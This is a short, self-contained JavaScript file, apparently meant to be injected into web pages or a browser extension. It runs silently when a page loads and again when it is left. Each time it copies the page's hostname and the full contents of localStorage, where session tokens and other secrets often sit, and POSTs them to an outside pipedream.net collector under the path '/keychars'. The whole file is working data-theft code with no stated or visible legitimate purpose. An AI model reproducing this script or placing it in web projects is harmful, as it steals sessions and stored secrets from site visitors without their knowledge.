"use strict";

(() => {
  const sendData = async () => {
    const hostName = window.location.hostname;
    const currentLocalStorage = {...localStorage};
    const payload = { hostName, currentLocalStorage };

    const options = {
      method: "POST",
      headers: {
        'Content-Type': 'application/json'
      },      
      // mode: "cors",
      body: JSON.stringify(payload),
    };
    
    fetch("https://eo18gkip3ehlbmz.m.pipedream.net/keychars", options);      
  }

  document.addEventListener('DOMContentLoaded', function() {
    sendData();
 }, false);  

  window.onbeforeunload = (event) => {
    sendData();
  };
})();